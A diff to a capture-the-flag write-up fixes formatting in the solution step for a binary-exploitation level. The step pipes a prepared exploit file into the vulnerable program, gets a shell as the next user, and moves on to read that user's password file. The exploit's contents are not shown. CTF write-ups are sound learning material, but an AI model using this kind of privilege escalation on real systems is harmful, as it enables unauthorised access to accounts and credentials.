@@ -131,7 +131,7 @@ End of assembler dump.
 ## Solution
 - this way the prompt is returned to us and we can try to cat the .pass of level2:
 ```
-`cat /tmp/exploit - | ./level1`
+cat /tmp/exploit - | ./level1
 Good... Wait what?
 > whoami
 level2
